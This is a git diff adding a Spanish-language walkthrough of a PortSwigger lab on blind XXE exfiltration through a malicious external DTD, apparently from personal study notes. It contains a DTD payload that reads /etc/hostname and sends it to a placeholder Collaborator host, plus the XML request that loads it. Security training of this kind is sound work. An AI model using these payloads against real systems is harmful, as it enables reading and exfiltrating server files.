@@ -111,3 +111,53 @@ Sabiendo esto vamos a **Burp Suite's Collaborator** y copia el payload generado 
 <figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-08 221213.png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-08 221142.png" alt=""><figcaption></figcaption></figure>
+
+## Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
+
+### Enunciado
+
+Este laboratorio tiene una funcionalidad de "Check stock" que analiza entradas XML pero no muestra el resultado. Exfiltra el contenido del archivo `/etc/hostname`.
+
+> Para evitar que la plataforma Academy se use para atacar a terceros, su firewall bloquea interacciones con sistemas externos arbitrarios. Para resolver el laboratorio, debes usar el servidor de explotación proporcionado y/o el servidor público por defecto de Burp Collaborator.
+
+### Resolución
+
+Miramos la petición del stock.
+
+<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-09 182655.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-09 182741.png" alt=""><figcaption></figcaption></figure>
+
+Primero debemos subir un archivo DTD externo que defina entidades para:
+
+* Leer el contenido de `/etc/hostname` en el servidor vulnerable.
+* Enviar esa información de vuelta a tu servidor o a Burp Collaborator.
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://TU-COLLABORATOR/?x=%file;'>">
+%eval;
+%exfil;
+```
+
+Cuando subamos ese archivo al exploit server, copia la URL pública generada. Por ejemplo:
+
+```
+https://exploit-...exploit-server.net/exploit
+```
+
+En la función de “check stock” de la aplicación vulnerable, debemos enviar un cuerpo XML como el siguiente, reemplazando "YOUR-EXPLOIT-URL" con la URL real de tu exploit:
+
+```xml
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-EXPLOIT-URL"> %xxe;]>
+<stockCheck>
+  <productId>2</productId>
+  <storeId>1</storeId>
+</stockCheck>
+```
+
+Finalmente, abrimos Burp Collaborator o revisa tu servidor para ver la petición recibida. En ella se incluirá el contenido del archivo `/etc/hostname` del servidor vulnerable.
+
+<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-09 190702.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-09 190733.png" alt=""><figcaption></figcaption></figure>
